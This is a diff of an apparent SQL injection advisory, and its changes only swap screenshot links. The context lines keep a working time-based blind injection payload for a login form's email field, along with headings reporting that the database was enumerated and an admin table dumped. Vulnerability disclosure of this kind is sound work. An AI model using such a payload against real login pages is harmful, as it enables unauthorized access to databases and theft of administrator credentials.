@@ -24,7 +24,7 @@
 #### Root Cause
 The code directly concatenates user input into SQL query strings without any parameterization or input validation, allowing attackers to inject malicious SQL code.
 
-![image](https://github.com/user-attachments/assets/bec8b0f9-6744-41df-ba06-c0227af52bc8)
+![image](https://github.com/user-attachments/assets/0e7d652f-1e2c-4b06-866e-95cfb685c93f)
 
 
 ### Impact:
@@ -49,8 +49,7 @@ The code directly concatenates user input into SQL query strings without any par
     Payload: email=' AND (SELECT 5803 FROM (SELECT(SLEEP(5)))LOuf) AND 'Hdtb'='Hdtb&password=Test@123&login=
 ```
 
-![image](https://github.com/user-attachments/assets/bd207556-a5fb-4ea8-9fae-81914ceab25d)
-
+![image](https://github.com/user-attachments/assets/02cae346-8e05-4eca-a8bd-fbc5d8b63a91)
 
 
 ### Proof of Concept:
@@ -61,21 +60,21 @@ email=' AND (SELECT 5803 FROM (SELECT(SLEEP(5)))LOuf) AND 'Hdtb'='Hdtb&password=
 ```
 ##### email is injectable!
 
-![image](https://github.com/user-attachments/assets/ad898ce2-96b9-4341-ba92-2f61104e75df)
+![image](https://github.com/user-attachments/assets/32621e1e-fd67-44ea-b4b1-14cbbda465df)
 
 
 ##### Databases information extracted
 
-![image](https://github.com/user-attachments/assets/6d4ed215-52cf-41c7-90ce-75145ffe9565)
+![image](https://github.com/user-attachments/assets/95bca1a6-375b-49c2-be80-a4b9fb159daf)
 
 
 ##### Tables information extracted
 
-![image](https://github.com/user-attachments/assets/1bae8f47-0bb8-413f-8058-315f1552c6fd)
+![image](https://github.com/user-attachments/assets/1a85e8ec-791b-4a11-bb1e-386038969be6)
 
 ##### Table=tbladmin data dumped!
 
-![image](https://github.com/user-attachments/assets/42f39a63-5f52-4b90-b250-53117c576828)
+![image](https://github.com/user-attachments/assets/3ed014ab-1ae3-4d77-8a82-466464b6381c)
 
 ### Suggested Remediation:
 ---
